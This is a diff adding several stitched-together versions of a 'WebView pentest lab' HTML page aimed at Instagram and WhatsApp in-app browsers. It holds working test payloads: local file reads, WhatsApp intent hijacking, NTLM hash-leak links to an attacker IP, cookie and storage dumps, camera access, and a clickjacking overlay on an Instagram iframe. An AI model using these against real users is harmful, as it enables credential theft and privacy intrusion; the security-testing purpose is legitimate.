@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>WebView Security Lab</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: Arial; padding: 20px; background: #f4f4f4; }
+        .test-case { background: white; padding: 15px; margin-bottom: 15px; border-radius: 8px; border-left: 5px solid #333; }
+        h3 { color: #d32f2f; margin-top: 0; }
+        button { background: #007bff; color: white; border: none; padding: 10px; border-radius: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <h2>WebView Vulnerability Test Lab</h2>
+    <p>Target: In-App Browser (Instagram/WhatsApp)</p>
+
+    <div class="test-case">
+        <h3>1. Deep Link / Intent Hijacking</h3>
+        <p>Check if WebView can trigger other apps without user prompt.</p>
+        <button onclick="location.href='intent://send?phone=919999999999&text=Hacked#Intent;scheme=whatsapp;package=com.whatsapp;end'">Trigger WhatsApp Intent</button>
+    </div>
+
+    <div class="test-case">
+        <h3>2. Local File Access</h3>
+        <p>Testing if the WebView can read system files (LFI).</p>
+        <button onclick="location.href='file:///etc/hosts'">Read /etc/hosts (Android)</button>
+        <button onclick="location.href='file:///sdcard/Download/test.txt'">Read SD Card File</button>
+    </div>
+
+    <div class="test-case">
+        <h3>3. UXSS Test</h3>
+        <p>Testing if we can execute JS in the context of the App.</p>
+        <button onclick="alert('WebView Context: ' + document.location)">Check Origin</button>
+    </div>
+
+    <div class="test-case">
+        <h3>4. SMB / NTLM Leak</h3>
+        <p>Testing if WebView leaks Windows credentials.</p>
+        <a href="file://YOUR_KALI_IP/leak" style="color:blue;">Click to Leak Hashes</a>
+    </div>
+
+    <div class="test-case">
+        <h3>5. JS Bridge Discovery</h3>
+        <p>Scanning for insecure Android JavaScript Interfaces.</p>
+        <button onclick="findBridges()">Scan for JS Bridges</button>
+        <p id="bridge-result"></p>
+    </div>
+
+    <script>
+        function findBridges() {
+            let found = [];
+            for (let obj in window) {
+                if (window[obj] && typeof window[obj] === 'object' && obj !== 'window') {
+                    found.push(obj);
+                }
+            }
+            document.getElementById('bridge-result').innerHTML = "Possible Bridges: " + found.join(", ");
+        }
+    </script>
+
+</body>
+</html>
+window.location.href = "https://www.google.com";
+<button onclick="location.href='file:///sdcard/Android/data/com.instagram.android/cache/test.txt'">Test Instagram Cache Access</button>
+<button onclick="location.href='file:///etc/hosts'">Read System Hosts (Android/Linux)</button>
+<button onclick="location.href='intent://send?phone=919999999999&text=Hacked#Intent;scheme=whatsapp;package=com.whatsapp;end'">Force WhatsApp Draft</button>
+<button onclick="location.href='tel:121'">Open Dialer</button>
+<div style="position:relative; width:500px; height:500px;">
+    <iframe src="https://www.instagram.com" style="width:100%; height:100%;"></iframe>
+    <div style="position:absolute; top:0; left:0; width:100%; height:100%; opacity:0.5; background:red;">
+        <p>User ko lagega wo yahan click kar raha hai, par click iframe mein hoga</p>
+    </div>
+</div>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WebView Pentest Lab v2.0</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #1a1a1a; color: #eee; padding: 20px; }
+        .card { background: #2d2d2d; border-radius: 10px; padding: 15px; margin-bottom: 20px; border-left: 5px solid #00ff00; shadow: 0 4px 8px rgba(0,0,0,0.5); }
+        h2 { color: #00ff00; border-bottom: 1px solid #444; padding-bottom: 10px; }
+        h3 { margin-top: 0; color: #ffcc00; }
+        .btn { display: inline-block; background: #007bff; color: white; padding: 10px 15px; text-decoration: none; border-radius: 5px; margin: 5px 0; cursor: pointer; border: none; }
+        .btn-red { background: #dc3545; }
+        .result-box { background: #000; color: #0f0; padding: 10px; border-radius: 5px; font-family: monospace; margin-top: 10px; min-height: 20px; }
+        code { color: #ff79c6; }
+    </style>
+</head>
+<body>
+
+    <h2>WebView Security Assessment Toolkit</h2>
+
+    <div class="card">
+        <h3>1. Local File Disclosure (LFI)</h3>
+        <p>Tests if the WebView can read sensitive files from the device.</p>
+        <button class="btn btn-red" onclick="location.href='file:///etc/hosts'">Read /etc/hosts (Linux/Android)</button>
+        <button class="btn btn-red" onclick="location.href='file:///sdcard/Download/test.txt'">Read SD Card</button>
+        <button class="btn btn-red" onclick="location.href='file:///proc/self/maps'">Read Memory Maps</button>
+    </div>
+
+    <div class="card">
+        <h3>2. Intent & Protocol Hijacking</h3>
+        <p>Checks if apps can be triggered without user consent.</p>
+        <button class="btn" onclick="location.href='intent://send?phone=919999999999&text=Vulnerable#Intent;scheme=whatsapp;package=com.whatsapp;end'">Trigger WhatsApp</button>
+        <button class="btn" onclick="location.href='tel:121'">Trigger Dialer</button>
+        <button class="btn" onclick="location.href='sms:121?body=Pwned'">Trigger SMS</button>
+    </div>
+
+    <div class="card">
+        <h3>3. JS Bridge Discovery</h3>
+        <p>Scanning for custom Java objects exposed to JavaScript.</p>
+        <button class="btn" onclick="scanBridges()">Scan for Bridges</button>
+        <div id="bridge-res" class="result-box">Click Scan...</div>
+    </div>
+
+    <div class="card">
+        <h3>4. Session & Cookie Test</h3>
+        <p>Checking if cookies are accessible via JS (if <code>HttpOnly</code> is missing).</p>
+        <button class="btn" onclick="checkCookies()">Show Cookies</button>
+        <div id="cookie-res" class="result-box">Cookies will appear here...</div>
+    </div>
+
+    <div class="card">
+        <h3>5. Hardware Permission Bypass</h3>
+        <p>Check if WebView asks for permission or triggers directly.</p>
+        <button class="btn" onclick="testCamera()">Test Camera Access</button>
+        <video id="video" width="100%" height="auto" autoplay style="margin-top:10px; border-radius:5px;"></video>
+    </div>
+
+    <div class="card">
+        <h3>6. Windows NTLM Leak</h3>
+        <p>If app is running on Windows, this will attempt to leak hashes.</p>
+        <a href="file://192.168.1.1/pentest" class="btn btn-red">Leak NTLM (Change IP)</a>
+    </div>
+
+    <script>
+        function scanBridges() {
+            let found = [];
+            const standard = ['window', 'self', 'document', 'location', 'history', 'navigator', 'screen', 'performance'];
+            for (let obj in window) {
+                if (window[obj] && typeof window[obj] === 'object' && !standard.includes(obj)) {
+                    found.push(obj);
+                }
+            }
+            document.getElementById('bridge-res').innerText = found.length > 0 ? "Found: " + found.join(", ") : "No Custom Bridges Found.";
+        }
+
+        function checkCookies() {
+            document.getElementById('cookie-res').innerText = document.cookie || "No Cookies Found (or HttpOnly enabled).";
+        }
+
+        async function testCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('video').srcObject = stream;
+            } catch (err) {
+                alert("Camera Blocked: " + err);
+            }
+        }
+    </script>
+
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WebView Pentest Lab v3.0</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #121212; color: #e0e0e0; padding: 20px; line-height: 1.6; }
+        .container { max-width: 800px; margin: auto; }
+        .card { background: #1e1e1e; border-radius: 12px; padding: 20px; margin-bottom: 20px; border-left: 6px solid #00e676; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+        h1 { color: #00e676; text-align: center; }
+        h3 { color: #ffeb3b; margin-top: 0; border-bottom: 1px solid #333; padding-bottom: 10px; }
+        p { font-size: 0.95rem; color: #bbb; }
+        .btn { display: inline-block; background: #2979ff; color: white; padding: 12px 20px; text-decoration: none; border-radius: 6px; margin: 8px 4px 8px 0; cursor: pointer; border: none; font-weight: bold; transition: 0.3s; }
+        .btn:hover { background: #1565c0; transform: translateY(-2px); }
+        .btn-red { background: #ff5252; }
+        .btn-red:hover { background: #d32f2f; }
+        .result-box { background: #000; color: #00ff00; padding: 15px; border-radius: 6px; font-family: 'Courier New', monospace; margin-top: 15px; border: 1px solid #333; white-space: pre-wrap; word-break: break-all; }
+        code { color: #f48fb1; background: #263238; padding: 2px 4px; border-radius: 4px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>WebView Security Toolkit</h1>
+    <p style="text-align: center;">Target: In-App Browsers (Instagram, WhatsApp, etc.)</p>
+
+    <div class="card">
+        <h3>1. Local File Disclosure (LFI)</h3>
+        <p>Yeh test karta hai ki kya WebView user ke phone ki files read kar sakta hai. <code>file://</code> protocol check karein.</p>
+        <button class="btn btn-red" onclick="location.href='file:///etc/hosts'">Read /etc/hosts (Android/Linux)</button>
+        <button class="btn btn-red" onclick="location.href='file:///sdcard/Download/test.txt'">Read SD Card File</button>
+        <button class="btn btn-red" onclick="location.href='file:///proc/self/maps'">Read Process Maps</button>
+    </div>
+
+    <div class="card">
+        <h3>2. Intent & Deep Link Hijacking</h3>
+        <p>Check karein ki kya link click karne par doosri apps bina warning ke trigger ho rahi hain.</p>
+        <button class="btn" onclick="location.href='intent://send?phone=919999999999&text=Vulnerable_Test#Intent;scheme=whatsapp;package=com.whatsapp;end'">Trigger WhatsApp</button>
+        <button class="btn" onclick="location.href='tel:121'">Open Phone Dialer</button>
+        <button class="btn" onclick="location.href='sms:121?body=Pwned_By_Pentester'">Open SMS Draft</button>
+    </div>
+
+    <div class="card">
+        <h3>3. JS Bridge Scanner</h3>
+        <p>Insecure Android Java Interfaces (JS Bridges) ko dhoondne ke liye scan karein.</p>
+        <button class="btn" onclick="scanBridges()">Scan for Custom Bridges</button>
+        <div id="bridge-res" class="result-box">Waiting for scan...</div>
+    </div>
+
+    <div class="card">
+        <h3>4. Clickjacking (Iframe) Test</h3>
+        <p>Check karein ki kya App <code>X-Frame-Options</code> ko ignore karke sensitive sites load karti hai.</p>
+        <button class="btn" onclick="loadIframe()">Try Load Instagram Iframe</button>
+        <div id="iframe-container" style="margin-top: 10px;"></div>
+    </div>
+
+    <div class="card">
+        <h3>5. Cookie & Storage Leak</h3>
+        <p>Check karein ki kya WebView ke cookies JavaScript ke liye accessible hain (Insecure <code>HttpOnly</code>).</p>
+        <button class="btn" onclick="checkData()">Show Cookies & LocalStorage</button>
+        <div id="data-res" class="result-box">No data fetched.</div>
+    </div>
+
+    <div class="card">
+        <h3>6. Hardware & Permission Test</h3>
+        <p>Check karein ki kya app bina puche Camera ya Mic trigger karti hai.</p>
+        <button class="btn" onclick="testCamera()">Test Camera Permission</button>
+        <video id="video" width="100%" height="auto" autoplay style="margin-top:10px; border-radius:8px; display:none;"></video>
+    </div>
+</div>
+
+<script>
+    // 1. JS Bridge Scanner
+    function scanBridges() {
+        let found = [];
+        const standard = ['window', 'self', 'document', 'location', 'history', 'navigator', 'screen', 'performance', 'frames', 'parent', 'top'];
+        for (let obj in window) {
+            try {
+                if (window[obj] && typeof window[obj] === 'object' && !standard.includes(obj)) {
+                    found.push(obj);
+                }
+            } catch (e) {}
+        }
+        document.getElementById('bridge-res').innerText = found.length > 0 ? "Potential Bridges Found:\n" + found.join(", ") : "No Custom JS Bridges Detected.";
+    }
+
+    // 2. Cookie & Session Checker
+    function checkData() {
+        let data = "Cookies: " + (document.cookie || "None Found") + "\n\n";
+        data += "LocalStorage Keys: " + Object.keys(localStorage).join(", ") || "None";
+        document.getElementById('data-res').innerText = data;
+    }
+
+    // 3. Iframe Loader (Clickjacking Test)
+    function loadIframe() {
+        const container = document.getElementById('iframe-container');
+        container.innerHTML = '<p style="color:red">Loading Iframe (Check console if it fails)...</p><iframe src="https://www.instagram.com" style="width:100%; height:300px; border:2px dashed #ff5252;"></iframe>';
+    }
+
+    // 4. Camera Permission Test
+    async function testCamera() {
+        const video = document.getElementById('video');
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            video.style.display = "block";
+            alert("SUCCESS: Camera accessed!");
+        } catch (err) {
+            alert("BLOCKED: Camera permission denied or not supported.\nError: " + err);
+        }
+    }
+
+    // 5. Automatic Redirect Test (Uncomment to test Zero-Click)
+    /*
+    window.onload = function() {
+        console.log("Testing Automatic Redirect...");
+        // window.location.href = "tel:121"; 
+    };
+    */
+</script>
+
+</body>
+</html>
